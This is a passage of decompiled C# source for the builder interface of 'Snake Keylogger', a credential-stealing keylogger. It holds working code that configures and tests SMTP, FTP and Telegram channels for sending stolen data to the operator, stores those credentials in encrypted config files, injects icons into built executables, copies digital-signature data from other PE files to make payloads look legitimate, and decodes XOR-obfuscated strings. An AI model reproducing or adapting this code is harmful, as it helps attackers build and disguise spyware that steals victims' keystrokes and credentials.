			return Path.GetDirectoryName(randomfilename) + "\\Obfuscator_Output\\" + Path.GetFileName(randomfilename);
		}

		// Token: 0x060000C0 RID: 192 RVA: 0x0000A95C File Offset: 0x00008B5C
		private void smtptestbtn_Click(object sender, EventArgs e)
		{
			try
			{
				MailMessage mailMessage = new MailMessage();
				mailMessage.To.Add(this.smtpreceivetxt.Text);
				mailMessage.From = new MailAddress(this.smtpsendtxt.Text);
				mailMessage.Subject = "Snake Keylogger";
				mailMessage.Body = " Snake Keylogger - Test Successfully. ";
				new SmtpClient(this.smtpservertxt.Text)
				{
					Port = Conversions.ToInteger(this.serverporttxt.Text),
					EnableSsl = true,
					Credentials = new NetworkCredential(this.smtpsendtxt.Text,this.smtppasstxt.Text)
				}.Send(mailMessage);
				Interaction.MsgBox("Test Successfully.", MsgBoxStyle.Information, null);
			}
			catch{ Interaction.MsgBox("Test Failed.", MsgBoxStyle.Critical, null); }
		}

		// Token: 0x060000C1 RID: 193 RVA: 0x000023AC File Offset: 0x000005AC
		private void ftptestbtn_Click(object sender, EventArgs e)
		{
		this.FtpUploadFile();
		}

		// Token: 0x060000C2 RID: 194 RVA: 0x0000AA68 File Offset: 0x00008C68
		private void ftploadbtn_Click(object sender, EventArgs e)
		{
            string text = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\SK";
			bool flag = File.Exists(text + "\\FTPConfig.ini");
			if (flag)
			{
				StreamReader streamReader = new StreamReader(text + "\\FTPConfig.ini");
			this.ftpurltxt.Text =this.Decrypt(streamReader.ReadLine());
			this.ftpusertxt.Text =this.Decrypt(streamReader.ReadLine());
			this.ftppasstxt.Text =this.Decrypt(streamReader.ReadLine());
				streamReader.Close();
				Console.ReadLine();
				Interaction.MsgBox(" FTP Loaded.", MsgBoxStyle.OkOnly, null);
			}
			else
			{
				Interaction.MsgBox(" Can't Find FTP Config.", MsgBoxStyle.OkOnly, null);
			}
		}

		// Token: 0x060000C3 RID: 195 RVA: 0x0000AB40 File Offset: 0x00008D40
		private void MetroButton1_Click(object sender, EventArgs e)
		{
			try
			{
                string text = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\SK";
				bool flag = File.Exists(text + "\\TelegramConfig.ini");
				if (flag)
				{
					StreamReader streamReader = new StreamReader(text + "\\TelegramConfig.ini");
				this.telegramuseridtxt.Text =this.Decrypt(streamReader.ReadLine());
				this.telegramtokentxt.Text =this.Decrypt(streamReader.ReadLine());
					streamReader.Close();
					Console.ReadLine();
					Interaction.MsgBox(" Telegram Loaded.", MsgBoxStyle.OkOnly, null);
				}
				else
				{
					Interaction.MsgBox(" Can't Find Telegram Config.", MsgBoxStyle.OkOnly, null);
				}
			}
			catch (Exception ex)
			{
				Interaction.MsgBox(ex.ToString(), MsgBoxStyle.OkOnly, null);
			}
		}

		// Token: 0x060000C4 RID: 196 RVA: 0x0000AC40 File Offset: 0x00008E40
		private void MetroChecker1_CheckedChanged(object sender, bool isChecked) {this.buildbtn.Enabled =this.MetroChecker1.Checked; }

		// Token: 0x060000C5 RID: 197 RVA: 0x0000AC84 File Offset: 0x00008E84
		private void smtpswitch_CheckedChanged(object sender, bool isChecked)
		{
		this.RecoverMethodType = "$%SMTPDV$";
		this.ftpswitch.Checked = true;
		this.telegramswitch.Checked = true;
			bool flag = !this.smtpswitch.Checked;
			if (flag)
			{
			this.smtpreceivetxt.Enabled = true;
			this.smtpsendtxt.Enabled = true;
			this.smtppasstxt.Enabled = true;
			this.smtpservertxt.Enabled = true;
			this.serverporttxt.Enabled = true;
			this.smtpcombo.Enabled = true;
			this.MetroSwitch1.Enabled = true;
			this.switchpasssmtp.Enabled = true;
			this.smtploadbtn.Enabled = true;
			this.smtptestbtn.Enabled = true;
			this.smtpsavebtn.Enabled = true;
			this.ftpurltxt.Enabled = false;
			this.ftpusertxt.Enabled = false;
			this.ftppasstxt.Enabled = false;
			this.ftpsavebtn.Enabled = false;
			this.ftptestbtn.Enabled = false;
			this.ftploadbtn.Enabled = false;
			this.switchpassftp.Enabled = false;
			this.telegramtokentxt.Enabled = false;
			this.telegramuseridtxt.Enabled = false;
			this.telegramsavebtn.Enabled = false;
			this.telegramtestbtn.Enabled = false;
			this.telegramloadbtn.Enabled = false;
			}
			else
			{
			this.smtpreceivetxt.Enabled = false;
			this.smtpsendtxt.Enabled = false;
			this.smtppasstxt.Enabled = false;
			this.smtpservertxt.Enabled = false;
			this.serverporttxt.Enabled = false;
			this.smtpcombo.Enabled = false;
			this.MetroSwitch1.Enabled = false;
			this.switchpasssmtp.Enabled = false;
			this.smtploadbtn.Enabled = false;
			this.smtptestbtn.Enabled = false;
			this.smtpsavebtn.Enabled = false;
			}
		}

		// Token: 0x060000C6 RID: 198 RVA: 0x0000AE90 File Offset: 0x00009090
		private void ftpswitch_CheckedChanged(object sender, bool isChecked)
		{
		this.RecoverMethodType = "%FTPDV$";
		this.smtpswitch.Checked = true;
		this.telegramswitch.Checked = true;
			bool flag = !this.ftpswitch.Checked;
			if (flag)
			{
			this.ftpurltxt.Enabled = true;
			this.ftpusertxt.Enabled = true;
			this.ftppasstxt.Enabled = true;
			this.ftpsavebtn.Enabled = true;
			this.ftptestbtn.Enabled = true;
			this.ftploadbtn.Enabled = true;
			this.switchpassftp.Enabled = true;
			this.telegramtokentxt.Enabled = false;
			this.telegramuseridtxt.Enabled = false;
			this.telegramsavebtn.Enabled = false;
			this.telegramtestbtn.Enabled = false;
			this.telegramloadbtn.Enabled = false;
			this.smtpreceivetxt.Enabled = false;
			this.smtpsendtxt.Enabled = false;
			this.smtppasstxt.Enabled = false;
			this.smtpservertxt.Enabled = false;
			this.serverporttxt.Enabled = false;
			this.smtpcombo.Enabled = false;
			this.MetroSwitch1.Enabled = false;
			this.switchpasssmtp.Enabled = false;
			this.smtploadbtn.Enabled = false;
			this.smtptestbtn.Enabled = false;
			this.smtpsavebtn.Enabled = false;
			}
			else
			{
			this.ftpurltxt.Enabled = false;
			this.ftpusertxt.Enabled = false;
			this.ftppasstxt.Enabled = false;
			this.ftpsavebtn.Enabled = false;
			this.ftptestbtn.Enabled = false;
			this.ftploadbtn.Enabled = false;
			this.switchpassftp.Enabled = false;
			}
		}

		// Token: 0x060000C7 RID: 199 RVA: 0x0000B068 File Offset: 0x00009268
		private void telegramswitch_CheckedChanged(object sender, bool isChecked)
		{
		this.RecoverMethodType = "$%TelegramDv$";
		this.smtpswitch.Checked = true;
		this.ftpswitch.Checked = true;
			bool flag = !this.telegramswitch.Checked;
			if (flag)
			{
			this.telegramtokentxt.Enabled = true;
			this.telegramuseridtxt.Enabled = true;
			this.telegramsavebtn.Enabled = true;
			this.telegramtestbtn.Enabled = true;
			this.telegramloadbtn.Enabled = true;
			this.ftpurltxt.Enabled = false;
			this.ftpusertxt.Enabled = false;
			this.ftppasstxt.Enabled = false;
			this.ftpsavebtn.Enabled = false;
			this.ftptestbtn.Enabled = false;
			this.ftploadbtn.Enabled = false;
			this.switchpassftp.Enabled = false;
			this.smtpreceivetxt.Enabled = false;
			this.smtpsendtxt.Enabled = false;
			this.smtppasstxt.Enabled = false;
			this.smtpservertxt.Enabled = false;
			this.serverporttxt.Enabled = false;
			this.smtpcombo.Enabled = false;
			this.MetroSwitch1.Enabled = false;
			this.switchpasssmtp.Enabled = false;
			this.smtploadbtn.Enabled = false;
			this.smtptestbtn.Enabled = false;
			this.smtpsavebtn.Enabled = false;
			}
			else
			{
			this.telegramtokentxt.Enabled = false;
			this.telegramuseridtxt.Enabled = false;
			this.telegramsavebtn.Enabled = false;
			this.telegramtestbtn.Enabled = false;
			this.telegramloadbtn.Enabled = false;
			}
		}

		// Token: 0x060000C8 RID: 200 RVA: 0x0000B228 File Offset: 0x00009428
		private void MetroButton3_Click(object sender, EventArgs e)
		{
			try
			{
			this.telegramsender(this.telegramtokentxt.Text,this.telegramuseridtxt.Text, "Snake Keylogger - Test Successfully.");
				Interaction.MsgBox("Test Successfully.", MsgBoxStyle.Information, null);
			}
			catch { Interaction.MsgBox("Test Failed.", MsgBoxStyle.Critical, null); }
		}

		// Token: 0x060000C9 RID: 201 RVA: 0x0000B2B0 File Offset: 0x000094B0
        private void MetroSwitch1_CheckedChanged(object sender, bool isChecked) {this.telegramuseridtxt.UseSystemPasswordChar =this.switchpassftp.Checked; }

		// Token: 0x060000CA RID: 202 RVA: 0x0000B2F4 File Offset: 0x000094F4
		private void MetroButton2_Click(object sender, EventArgs e)
		{
            bool flag = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\SK");
			if (!flag)
			{
                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\SK");
			}
            string text = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\SK";
			try { File.Delete(text + "\\TelegramConfig.ini"); }
			catch { }
			try
			{
				StreamWriter streamWriter = new StreamWriter(text + "\\TelegramConfig.ini");
				streamWriter.WriteLine(this.Encrypt(this.telegramuseridtxt.Text));
				streamWriter.WriteLine(this.Encrypt(this.telegramtokentxt.Text));
				streamWriter.Close();
				Interaction.MsgBox(" Telegram Config Saved.", MsgBoxStyle.OkOnly, null);
			}
			catch (Exception ex)
			{
				Interaction.MsgBox("Problem:  " + ex.Message, MsgBoxStyle.OkOnly, null);
			}
		}

		// Token: 0x060000CB RID: 203 RVA: 0x00002331 File Offset: 0x00000531
		private void MetroSwitch2_CheckedChanged(object sender, bool isChecked)
		{
		}

		// Token: 0x04000032 RID: 50
		private object PASSWORD;

		// Token: 0x04000033 RID: 51
		private byte[] BytePublicer;

		// Token: 0x04000034 RID: 52
		public static bool SIGNNNature;

		// Token: 0x04000035 RID: 53
		private Random T;

		// Token: 0x04000036 RID: 54
		public string RecoverMethodType;

		// Token: 0x04000037 RID: 55
		public string Getter;

		// Token: 0x02000012 RID: 18
		public class IconInjector
		{
			// Token: 0x06000254 RID: 596 RVA: 0x00003311 File Offset: 0x00001511
			public static void InjectIcon(string exeFileName, string iconFileName)
			{
				Form1.IconInjector.InjectIcon(exeFileName, iconFileName, 1U, 1U);
			}

			// Token: 0x06000255 RID: 597 RVA: 0x0001AF28 File Offset: 0x00019128
			public static void InjectIcon(string exeFileName, string iconFileName, uint iconGroupID, uint iconBaseID)
			{
				Form1.IconInjector.IconFile iconFile = Form1.IconInjector.IconFile.FromFile(iconFileName);
				IntPtr intPtr = Form1.IconInjector.NativeMethods.BeginUpdateResource(exeFileName, false);
				byte[] array = iconFile.CreateIconGroupData(iconBaseID);
				Form1.IconInjector.NativeMethods.UpdateResource(intPtr, new IntPtr(0xEL), new IntPtr((long)((ulong)iconGroupID)), 0, array, array.Length);
				checked
				{
					int num = iconFile.ImageCount - 1;
					for (int i = 0; i <= num; i++)
					{
						byte[] array2 = iconFile.GetImageData(i);
						Form1.IconInjector.NativeMethods.UpdateResource(intPtr, new IntPtr(3L), new IntPtr((long)(unchecked((ulong)iconBaseID) + (ulong)(unchecked((long)i)))), 0, array2, array2.Length);
					}
					Form1.IconInjector.NativeMethods.EndUpdateResource(intPtr, false);
				}
			}

			// Token: 0x02000013 RID: 19
			[SuppressUnmanagedCodeSecurity]
			private class NativeMethods
			{
				// Token: 0x06000257 RID: 599
				[DllImport("kernel32")]
				public static extern IntPtr BeginUpdateResource(string fileName, [MarshalAs(UnmanagedType.Bool)] bool deleteExistingResources);

				// Token: 0x06000258 RID: 600
				[DllImport("kernel32")]
				[return: MarshalAs(UnmanagedType.Bool)]
				public static extern bool UpdateResource(IntPtr hUpdate, IntPtr type, IntPtr name, short language, [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 5)] byte[] data, int dataSize);

				// Token: 0x06000259 RID: 601
				[DllImport("kernel32")]
				[return: MarshalAs(UnmanagedType.Bool)]
				public static extern bool EndUpdateResource(IntPtr hUpdate, [MarshalAs(UnmanagedType.Bool)] bool discard);
			}

			// Token: 0x02000014 RID: 20
			private struct ICONDIR
			{
				// Token: 0x040000FB RID: 251
				public ushort Reserved;

				// Token: 0x040000FC RID: 252
				public ushort Type;

				// Token: 0x040000FD RID: 253
				public ushort Count;
			}

			// Token: 0x02000015 RID: 21
			private struct ICONDIRENTRY
			{
				// Token: 0x040000FE RID: 254
				public byte Width;

				// Token: 0x040000FF RID: 255
				public byte Height;

				// Token: 0x04000100 RID: 256
				public byte ColorCount;

				// Token: 0x04000101 RID: 257
				public byte Reserved;

				// Token: 0x04000102 RID: 258
				public ushort Planes;

				// Token: 0x04000103 RID: 259
				public ushort BitCount;

				// Token: 0x04000104 RID: 260
				public int BytesInRes;

				// Token: 0x04000105 RID: 261
				public int ImageOffset;
			}

			// Token: 0x02000016 RID: 22
			private struct BITMAPINFOHEADER
			{
				// Token: 0x04000106 RID: 262
				public uint Size;

				// Token: 0x04000107 RID: 263
				public int Width;

				// Token: 0x04000108 RID: 264
				public int Height;

				// Token: 0x04000109 RID: 265
				public ushort Planes;

				// Token: 0x0400010A RID: 266
				public ushort BitCount;

				// Token: 0x0400010B RID: 267
				public uint Compression;

				// Token: 0x0400010C RID: 268
				public uint SizeImage;

				// Token: 0x0400010D RID: 269
				public int XPelsPerMeter;

				// Token: 0x0400010E RID: 270
				public int YPelsPerMeter;

				// Token: 0x0400010F RID: 271
				public uint ClrUsed;

				// Token: 0x04000110 RID: 272
				public uint ClrImportant;
			}

			// Token: 0x02000017 RID: 23
			[StructLayout(LayoutKind.Sequential, Pack = 2)]
			private struct GRPICONDIRENTRY
			{
				// Token: 0x04000111 RID: 273
				public byte Width;

				// Token: 0x04000112 RID: 274
				public byte Height;

				// Token: 0x04000113 RID: 275
				public byte ColorCount;

				// Token: 0x04000114 RID: 276
				public byte Reserved;

				// Token: 0x04000115 RID: 277
				public ushort Planes;

				// Token: 0x04000116 RID: 278
				public ushort BitCount;

				// Token: 0x04000117 RID: 279
				public int BytesInRes;

				// Token: 0x04000118 RID: 280
				public ushort ID;
			}

			// Token: 0x02000018 RID: 24
			private class IconFile
			{
				// Token: 0x170000F4 RID: 244
				// (get) Token: 0x0600025A RID: 602 RVA: 0x0001AFBC File Offset: 0x000191BC
				public int ImageCount
				{
					get
					{
						return (int)this.iconDir.Count;
					}
				}

				// Token: 0x170000F5 RID: 245
				// (get) Token: 0x0600025B RID: 603 RVA: 0x0001AFDC File Offset: 0x000191DC
				public byte[] GetImageData(int index) { return this.iconImage[index]; }

				// Token: 0x0600025C RID: 604 RVA: 0x0000331E File Offset: 0x0000151E
				private IconFile()
				{
				this.iconDir = default(Form1.IconInjector.ICONDIR);
				}

				// Token: 0x0600025D RID: 605 RVA: 0x0001AFFC File Offset: 0x000191FC
				public static Form1.IconInjector.IconFile FromFile(string filename)
				{
					Form1.IconInjector.IconFile iconFile = new Form1.IconInjector.IconFile();
					byte[] array = File.ReadAllBytes(filename);
					GCHandle gchandle = GCHandle.Alloc(array, GCHandleType.Pinned);
					iconFile.iconDir = (Form1.IconInjector.ICONDIR)Marshal.PtrToStructure(gchandle.AddrOfPinnedObject(), typeof(Form1.IconInjector.ICONDIR));
					checked
					{
						iconFile.iconEntry = new Form1.IconInjector.ICONDIRENTRY[(int)(iconFile.iconDir.Count - 1 + 1)];
						iconFile.iconImage = new byte[(int)(iconFile.iconDir.Count - 1 + 1)][];
						int num = Marshal.SizeOf(iconFile.iconDir);
						Type typeFromHandle = typeof(Form1.IconInjector.ICONDIRENTRY);
						int num2 = Marshal.SizeOf(typeFromHandle);
						int num3 = (int)(iconFile.iconDir.Count - 1);
						for (int i = 0; i <= num3; i++)
						{
							Form1.IconInjector.ICONDIRENTRY icondirentry = (Form1.IconInjector.ICONDIRENTRY)Marshal.PtrToStructure(new IntPtr(gchandle.AddrOfPinnedObject().ToInt64() + unchecked((long)num)), typeFromHandle);
							iconFile.iconEntry[i] = icondirentry;
							iconFile.iconImage[i] = new byte[icondirentry.BytesInRes - 1 + 1];
							Buffer.BlockCopy(array, icondirentry.ImageOffset, iconFile.iconImage[i], 0, icondirentry.BytesInRes);
							num += num2;
						}
						gchandle.Free();
						return iconFile;
					}
				}

				// Token: 0x0600025E RID: 606 RVA: 0x0001B148 File Offset: 0x00019348
				public byte[] CreateIconGroupData(uint iconBaseID)
				{
					checked
					{
						int num = Marshal.SizeOf(typeof(Form1.IconInjector.ICONDIR)) + Marshal.SizeOf(typeof(Form1.IconInjector.GRPICONDIRENTRY)) *this.ImageCount;
						byte[] array = new byte[num - 1 + 1];
						GCHandle gchandle = GCHandle.Alloc(array, GCHandleType.Pinned);
						Marshal.StructureToPtr(this.iconDir, gchandle.AddrOfPinnedObject(), false);
						int num2 = Marshal.SizeOf(this.iconDir);
						int num3 =this.ImageCount - 1;
						for (int i = 0; i <= num3; i++)
						{
							Form1.IconInjector.GRPICONDIRENTRY grpicondirentry = default(Form1.IconInjector.GRPICONDIRENTRY);
							Form1.IconInjector.BITMAPINFOHEADER bitmapinfoheader = default(Form1.IconInjector.BITMAPINFOHEADER);
							GCHandle gchandle2 = GCHandle.Alloc(bitmapinfoheader, GCHandleType.Pinned);
							Marshal.Copy(this.GetImageData(i), 0, gchandle2.AddrOfPinnedObject(), Marshal.SizeOf(typeof(Form1.IconInjector.BITMAPINFOHEADER)));
							gchandle2.Free();
							grpicondirentry.Width =this.iconEntry[i].Width;
							grpicondirentry.Height =this.iconEntry[i].Height;
							grpicondirentry.ColorCount =this.iconEntry[i].ColorCount;
							grpicondirentry.Reserved =this.iconEntry[i].Reserved;
							grpicondirentry.Planes = bitmapinfoheader.Planes;
							grpicondirentry.BitCount = bitmapinfoheader.BitCount;
							grpicondirentry.BytesInRes =this.iconEntry[i].BytesInRes;
							grpicondirentry.ID = (ushort)(unchecked((ulong)iconBaseID) + (ulong)(unchecked((long)i)));
							Marshal.StructureToPtr(grpicondirentry, new IntPtr(gchandle.AddrOfPinnedObject().ToInt64() + unchecked((long)num2)), false);
							num2 += Marshal.SizeOf(typeof(Form1.IconInjector.GRPICONDIRENTRY));
						}
						gchandle.Free();
						return array;
					}
				}

				// Token: 0x04000119 RID: 281
				private Form1.IconInjector.ICONDIR iconDir;

				// Token: 0x0400011A RID: 282
				private Form1.IconInjector.ICONDIRENTRY[] iconEntry;

				// Token: 0x0400011B RID: 283
				private byte[][] iconImage;
			}
		}

		// Token: 0x02000019 RID: 25
		public class Randomization
		{
			// Token: 0x0200001A RID: 26
			public class RandomPassword
			{
				// Token: 0x06000262 RID: 610 RVA: 0x0001B31C File Offset: 0x0001951C
				public static string Generate()
				{
					return Form1.Randomization.RandomPassword.Generate(Form1.Randomization.RandomPassword.DEFAULT_MIN_PASSWORD_LENGTH, Form1.Randomization.RandomPassword.DEFAULT_MAX_PASSWORD_LENGTH);
				}

				// Token: 0x06000263 RID: 611 RVA: 0x0001B33C File Offset: 0x0001953C
				public static string Generate(int length)
				{
					return Form1.Randomization.RandomPassword.Generate(length, length);
				}

				// Token: 0x06000264 RID: 612 RVA: 0x0001B354 File Offset: 0x00019554
				public static string Generate(int minLength, int maxLength)
				{
					bool flag = (minLength <= 0) | (maxLength <= 0) | (minLength > maxLength);
					if (flag)
					{
					}
					char[][] array = new char[][]
					{
						Form1.Randomization.RandomPassword.PASSWORD_CHARS_LCASE.ToCharArray(),
						Form1.Randomization.RandomPassword.PASSWORD_CHARS_UCASE.ToCharArray(),
						Form1.Randomization.RandomPassword.PASSWORD_CHARS_UCASE.ToCharArray()
					};
					checked
					{
						int[] array2 = new int[array.Length - 1 + 1];
						int num = array2.Length - 1;
						for (int i = 0; i <= num; i++)
						{
							array2[i] = array[i].Length;
						}
						int[] array3 = new int[array.Length - 1 + 1];
						int num2 = array3.Length - 1;
						for (int i = 0; i <= num2; i++)
						{
							array3[i] = i;
						}
						byte[] array4 = new byte[4];
						RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider();
						rngcryptoServiceProvider.GetBytes(array4);
						int num3 = unchecked(((int)(array4[0] & 0x7F) << 0x18) | (int)((byte)(array4[1] << (0x10 & 7))) | (int)((byte)(array4[2] << (8 & 7)))) | (int)array4[3];
						Random random = new Random(num3);
						bool flag2 = minLength < maxLength;
						char[] array5;
						if (flag2)
						{
							array5 = new char[random.Next(minLength - 1, maxLength) + 1];
						}
						else
						{
							array5 = new char[minLength - 1 + 1];
						}
						int num4 = array3.Length - 1;
						int num5 = array5.Length - 1;
						for (int i = 0; i <= num5; i++)
						{
							bool flag3 = num4 == 0;
							int num6;
							if (flag3)
							{
								num6 = 0;
							}
							else
							{
								num6 = random.Next(0, num4);
							}
							int num7 = array3[num6];
							int num8 = array2[num7] - 1;
							bool flag4 = num8 == 0;
							int num9;
							if (flag4)
							{
								num9 = 0;
							}
							else
							{
								num9 = random.Next(0, num8 + 1);
							}
							array5[i] = array[num7][num9];
							bool flag5 = num8 == 0;
							if (flag5)
							{
								array2[num7] = array[num7].Length;
							}
							else
							{
								bool flag6 = num8 != num9;
								if (flag6)
								{
									char c = array[num7][num8];
									array[num7][num8] = array[num7][num9];
									array[num7][num9] = c;
								}
								array2[num7]--;
							}
							bool flag7 = num4 == 0;
							if (flag7)
							{
								num4 = array3.Length - 1;
							}
							else
							{
								bool flag8 = num4 != num6;
								if (flag8)
								{
									int num10 = array3[num4];
									array3[num4] = array3[num6];
									array3[num6] = num10;
								}
								num4--;
							}
						}
						return new string(array5);
					}
				}

				// Token: 0x0400011C RID: 284
				private static int DEFAULT_MIN_PASSWORD_LENGTH = 8;

				// Token: 0x0400011D RID: 285
				private static int DEFAULT_MAX_PASSWORD_LENGTH = 0xA;

				// Token: 0x0400011E RID: 286
				private static string PASSWORD_CHARS_LCASE = "abcdefgijkmnopqrstwxyz";

				// Token: 0x0400011F RID: 287
				private static string PASSWORD_CHARS_UCASE = "ABCDEFGHJKLMNPQRSTWXYZ";
			}
		}

		// Token: 0x0200001B RID: 27
		internal class Signatures
		{
			// Token: 0x06000266 RID: 614 RVA: 0x0001B5D0 File Offset: 0x000197D0
			public static byte[] DigitalSignatures(byte[] byte_0, bool Signature)
			{
				byte[] result = null;
				try
				{
					byte[] array = new byte[4];
					MemoryStream memoryStream = new MemoryStream(byte_0, 0, byte_0.Length);
					memoryStream.Seek(0x3CL, SeekOrigin.Begin);
					memoryStream.Read(array, 0, 2);
					int num = (int)BitConverter.ToInt16(array, 0);
                    memoryStream.Seek((long)(checked(num + (Signature?0xA8:0x98))), SeekOrigin.Begin);
                    memoryStream.Read(array, 0, 4);
                    int num2 = BitConverter.ToInt32(array, 0);
                    memoryStream.Read(array, 0, 4);
                    int num3 = BitConverter.ToInt32(array, 0);
                    byte[] array2 = new byte[checked(num3 - 1 + 1)];
                    memoryStream.Seek((long)num2, SeekOrigin.Begin);
                    memoryStream.Read(array2, 0, num3);
                    memoryStream.Close();
                    result = array2;
				}
				catch { }
                return result;
			}

			// Token: 0x06000267 RID: 615 RVA: 0x0001B728 File Offset: 0x00019928
			private static byte[] smethod_1(byte[] byte_0, int int_0, int int_1, bool Signature)
			{
				byte[] array = new byte[4];
				MemoryStream memoryStream = new MemoryStream(byte_0, 0, byte_0.Length);
                memoryStream.Seek(0x3CL, SeekOrigin.Begin);
                memoryStream.Read(array, 0, 2);
                int num2 = (int)BitConverter.ToInt16(array, 0);
                memoryStream.Seek((long)(checked(num2 + (Signature ? 0xA0 : 0x98))), SeekOrigin.Begin);
				memoryStream.Write(BitConverter.GetBytes(int_1), 0, 4);
				memoryStream.Write(BitConverter.GetBytes(int_0), 0, 4);
				return memoryStream.ToArray();
			}

			// Token: 0x06000268 RID: 616 RVA: 0x0001B7E4 File Offset: 0x000199E4
			public static byte[] Method(byte[] byte_0, byte[] byte_1, bool Signature)
			{
				checked
				{
					byte[] array3;
					try
					{
						MemoryStream memoryStream = new MemoryStream(byte_1, 0, byte_1.Length);
						byte[] array = new byte[(int)(memoryStream.Length - 1L) + 1];
						memoryStream.Read(array, 0, Convert.ToInt32(memoryStream.Length));
						memoryStream.Close();
						MemoryStream memoryStream2 = new MemoryStream(byte_0, 0, byte_0.Length);
						byte[] array2 = new byte[(int)(memoryStream2.Length - 1L) + 1];
						memoryStream2.Read(array2, 0, Convert.ToInt32(memoryStream2.Length));
						memoryStream.Close();
						int num = array2.Length + array.Length;
						MemoryStream memoryStream3 = new MemoryStream(new byte[num - 1 + 1], 0, num, true, true);
						memoryStream3.Write(array2, 0, array2.Length);
						memoryStream3.Write(array, 0, array.Length);
						byte[] buffer = memoryStream3.GetBuffer();
						array3 = Form1.Signatures.smethod_1(buffer, array.Length, array2.Length, Signature);
					}
					catch { array3 = new byte[0]; }
					return array3;
				}
			}

			// unused
			public static string smethod_3(byte[] byte_0)
			{
				ushort num = 0;
				string text = string.Empty;
				string text2;
				try
				{
					using (MemoryStream memoryStream = new MemoryStream(byte_0, 0, byte_0.Length))
					{
						using (BinaryReader binaryReader = new BinaryReader(memoryStream))
						{
							bool flag = binaryReader.ReadUInt16() == 0x5A4D;
							if (flag)
							{
								memoryStream.Seek(0x3AL, SeekOrigin.Current);
								memoryStream.Seek((long)((ulong)binaryReader.ReadUInt32()), SeekOrigin.Begin);
								bool flag2 = (ulong)binaryReader.ReadUInt32() == 0x4550UL;
								if (flag2)
								{
									memoryStream.Seek(0x14L, SeekOrigin.Current);
									num = binaryReader.ReadUInt16();
								}
							}
						}
					}
					if (num == 0) { throw new Exception(); }
					if (num != 0x10B)
					{
						if (num == 0x20B)
						{
							text = Form1.Digitial.DigitalSignatures("3İɁ\u036bѵ");
							Form1.SIGNNNature = true;
						}
						return text;
					}
					text = Form1.Digitial.DigitalSignatures("6ĶɁ\u036bѵ");
					Form1.SIGNNNature = false;
					return text;
				}
				catch
				{
					text2 = Form1.Digitial.DigitalSignatures("Aũɰ\u0364Ѩժ٦ܠ");
				}
				return text2;
			}
		}

		// Token: 0x0200001C RID: 28
		public class Digitial
		{
			// Token: 0x0600026B RID: 619 RVA: 0x0001BAB4 File Offset: 0x00019CB4
			public static string DigitalSignatures(string string_0)
			{
				checked
				{
					string text = "";
					try
					{
						int length = string_0.Length;
						char[] array = new char[length - 1 + 1];
						int num = array.Length - 1;
						for (int i = 0; i <= num; i++)
						{
							char c = string_0[i];
							byte b = (byte)((int)c ^ (length - i));
							array[i] = Strings.ChrW((0x00 << 8) | (int)b);
						}
						text = string.Intern(new string(array));
					}
					catch { }
					return text;
				}
			}
		}
	}
}
